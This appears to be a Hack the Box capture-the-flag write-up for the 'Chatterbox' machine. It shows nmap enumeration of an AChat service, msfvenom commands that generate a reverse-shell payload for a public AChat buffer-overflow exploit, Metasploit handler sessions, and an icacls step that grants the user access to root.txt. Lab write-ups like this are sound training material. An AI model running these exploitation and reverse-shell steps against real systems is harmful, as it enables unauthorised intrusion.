---
layout: post
title: "Hack the Box - Chatterbox Write up"
date: 2018-05-13
description: "Write up for the Hack the box Machine Chatterbox."
categories: [write-up, hackthebox]
tags: [writeup, pentesting, hackthebox]
---

You can view the original write-up on my blog here: https://dastinia.io/write-up/hackthebox/2018/05/13/hackthebox-chatterbox-writeup/

## Introduction
!["Chatterbox"](/assets/chatterbox/3.png "Chatterbox")


## Tools Used.
- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
- [Msfvenom](https://www.offensive-security.com/metasploit-unleashed/msfvenom/)
- [Nmap](https://nmap.org/)
- [SearchSploit](https://www.exploit-db.com/searchsploit/)

## Enumeration 

### Initial Scanning

Like with every box, lets start off with an nmap scan against the Chatterbox machine (10.10.10.74)...

```
root@dastinia:~/htb/chatterbox# nmap -T4 -sC -sV -n 10.10.10.74 -oA chatterbox_inital_scan
Starting Nmap 7.70 ( https://nmap.org ) at 2018-05-22 21:50 EDT
Stats: 0:01:13 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 45.00% done; ETC: 21:53 (0:01:28 remaining)
Stats: 0:01:16 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 47.00% done; ETC: 21:53 (0:01:25 remaining)Nmap scan report for 10.10.10.74Host is up (0.16s latency).
All 1000 scanned ports on 10.10.10.74 are filtered
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 161.17 seconds
root@dastinia:~/htb/chatterbox#
```

Interestingly enough, there were no ports alive... There might be some sort of filtering is taking place on the box, or it's getting destroyed by other HTB users so I ran a slower full port scan against the box. 

```
root@dastinia:~/htb/chatterbox# cat chatterbox_min_rate_500.nmap
# Nmap 7.70 scan initiated Tue May 22 22:12:31 2018 as: nmap -sC -sV -n -sT -p- --min-rate 500 -oA chatterbox_min_rate_500 10.10.10.74
Nmap scan report for 10.10.10.74
Host is up (0.16s latency).
Not shown: 65533 filtered ports
PORT     STATE SERVICE    VERSION
9255/tcp open  mon?
9256/tcp open  tcpwrapped

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue May 22 22:18:41 2018 -- 1 IP address (1 host up) scanned in 370.95 seconds
```

Interesting we are getting responses on two ports, but with no useful information as to what service is running on the port. 
I'm going to scan (yet again) to further enumerate what the service is. But this time we are going to run it at a `T2` rate in case the firewall is dropping traffic due to speed.

```
root@dastinia:~/htb/chatterbox# nmap -T2  --max-retries 5 -sV -sC -p9255,9256 10.10.10.74 -oA chatterbox_p9255-9256_sc
Starting Nmap 7.70 ( https://nmap.org ) at 2018-05-22 22:34 EDT
Nmap scan report for 10.10.10.74
Host is up (0.16s latency).

PORT     STATE SERVICE VERSION
9255/tcp open  http    AChat chat system httpd
|_http-server-header: AChat
|_http-title: Site doesn't have a title.
9256/tcp open  achat   AChat chat system

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.60 seconds
```

### Enumerating Port 9255 (AChat Chat System httpd)

If you complete some research on "AChat" you discover a few CVE for the application, including a buffer overflow exploit for [AChat version 0.150 beta7](https://www.exploit-db.com/exploits/36025/), which you can find on searchsploit/exploit-db. 

!["SearchSploit Output for AChat"](/assets/chatterbox/2.png "SearchSploit Output for AChat")

After some quick googling, and looking at the [AChat  project's sourceforge](https://sourceforge.net/projects/achat/?source=navbar) page you will discover that the last version of Achat to be released was `AChat 0.150 beta7`. So there's a pretty high chance that this is version of the software running on Chatterbox. 

### Modifying Exploit ShellCode & Testing Locally

One of the first things I pay attention to is the architecture of the machine that this exploit was tested or developed for (in this case Windows 7 32bit),and what the POC exploit code is executing when it triggers. Usually the exploit developer will let you know what versions of _"x"_ the following was tested as working on. For this exploit, the exploit developer generated shellcode to execute the calculator program when the exploit triggers. This is pretty useless to us, so we are going to drop-in-replace the `exac/calc` shellcode for simple `reverse shell` payload and go from there.

I downloaded a copy of the vulnerable AChat program, and ran it on a 64-bit Windows 7 virtual machine.

_generating windows reverse shell shellcode with msfvenom_
```
root@dastinia:~/htb/chatterbox# msfvenom -a x86 --platform Windows -p windows/shell/reverse_tcp  LHOST=192.168.30.130 LPORT=8282 -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/unicode_mixed
x86/unicode_mixed succeeded with size 808 (iteration=0)
x86/unicode_mixed chosen with final size 808
Payload size: 808 bytes
Final size of python file: 3872 bytes
buf =  ""
buf += "\x50\x50\x59\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49"
buf += "\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41"
buf += "\x49\x41\x49\x41\x49\x41\x6a\x58\x41\x51\x41\x44\x41"
buf += "\x5a\x41\x42\x41\x52\x41\x4c\x41\x59\x41\x49\x41\x51"
buf += "\x41\x49\x41\x51\x41\x49\x41\x68\x41\x41\x41\x5a\x31"
buf += "\x41\x49\x41\x49\x41\x4a\x31\x31\x41\x49\x41\x49\x41"
buf += "\x42\x41\x42\x41\x42\x51\x49\x31\x41\x49\x51\x49\x41"
buf += "\x49\x51\x49\x31\x31\x31\x41\x49\x41\x4a\x51\x59\x41"
buf += "\x5a\x42\x41\x42\x41\x42\x41\x42\x41\x42\x6b\x4d\x41"
buf += "\x47\x42\x39\x75\x34\x4a\x42\x4b\x4c\x69\x58\x32\x62"
buf += "\x49\x70\x39\x70\x6d\x30\x4f\x70\x62\x69\x48\x65\x30"
buf += "\x31\x79\x30\x71\x54\x64\x4b\x52\x30\x6c\x70\x42\x6b"
...Snip....
```

_After executing the modified exploit..._
```
msf exploit(multi/handler) > set PAYLOAD windows/shell/reverse_tcp
PAYLOAD => windows/shell/reverse_tcp
msf exploit(multi/handler) > set LHOST 192.168.30.130
LHOST => 192.168.30.130
msf exploit(multi/handler) > set LPORT 8282
LPORT => 8282
msf exploit(multi/handler) > exploit -j -z
[*] Exploit running as background job 1.

[*] Started reverse TCP handler on 192.168.30.130:8282

[*] Command shell session 2 opened (192.168.30.130:8282 -> 192.168.30.141:49389) at 2018-05-26 16:44:36 -0400
msf exploit(multi/handler) > sessions

Active sessions
===============

  Id  Name  Type               Information                                                                       Connection
  --  ----  ----               -----------                                                                       ----------
  1         shell x86/windows  Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation...  192.168.30.130:8282 -> 192.168.30.141:49388 (192.168.30.141)
  2         shell x86/windows                                                                                    192.168.30.130:8282 -> 192.168.30.141:49389 (192.168.30.141)


msf exploit(multi/handler) > sessions -i 2
[*] Starting interaction with 2...

Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
win-ecc1ucer094\medic
```

Now we know that the exploit works & we can successfully get a shell. It may seem like overkill, but I feel like it's good to understand what a potentially unknown exploit is doing on a local machine before you try exploiting something remotely. It will save tons of time trying to debug why _x_ or _y_ isn't working, or in determining if the machine simply needs a reset because the service crashed, or there's other strangeness taking place. 


## Getting Shell/Root.txt
So we know the exploit works, so let's modify our msfvenom command to give us a reverse shell for our HTB IP.
```
root@dastinia:~# msfvenom -a x86 --platform Windows -p windows/shell/reverse_tcp  LHOST=10.10.15.226 LPORT=8282 -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
```

_after executing the modified exploit..._
```
msf > use exploit/multi/handler
msf exploit(multi/handler) > set PAYLOAD windows/shell/reverse_tcp
PAYLOAD => windows/shell/reverse_tcp
msf exploit(multi/handler) >  set LHOST tun0
LHOST => tun0
msf exploit(multi/handler) > set LPORT 8282
LPORT => 8282
msf exploit(multi/handler) > set ExitOnSession False
ExitOnSession => false
msf exploit(multi/handler) > exploit -j -z
[*] Exploit running as background job 0.

[*] Started reverse TCP handler on 10.10.15.226:8282
msf exploit(multi/handler) > [*] Encoded stage with x86/shikata_ga_nai
[*] Sending encoded stage (267 bytes) to 10.10.10.74
[*] Command shell session 1 opened (10.10.15.226:8282 -> 10.10.10.74:49178) at 2018-06-14 21:55:43 -0400
```

```
msf exploit(multi/handler) > sessions -i 1
[*] Starting interaction with 1...

Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
chatterbox\alfred
C:\Users\Alfred\Desktop>type user.txt
[redacted]
```

There seemed to be a file permissions misconfiguration on the local `administrators` folder, and the `root.txt` file. I assumed this was the 
method we were supposed to take to get the `root.txt` flag. `root.txt` is owned by `Alfred` so we can use `icacls` to give full permissions on the `root.txt` file so we can read it. 

_getting root.txt by using icalcs to grant full permissions on the file_
```
C:\Users\Administrator\Desktop>dir /Q
 Volume in drive C has no label.
 Volume Serial Number is 9034-6528

 Directory of C:\Users\Administrator\Desktop

12/10/2017  07:50 PM    <DIR>          BUILTIN\Administrators .
12/10/2017  07:50 PM    <DIR>          NT AUTHORITY\SYSTEM    ..
12/10/2017  07:50 PM                32 CHATTERBOX\Alfred      root.txt
               1 File(s)             32 bytes
               2 Dir(s)  17,758,883,840 bytes free

C:\Users\Administrator\Desktop>icacls.exe root.txt /grant CHATTERBOX\Alfred:F
processed file: root.txt
Successfully processed 1 files; Failed processing 0 files

C:\Users\Administrator\Desktop>type root.txt
[redacted]
```
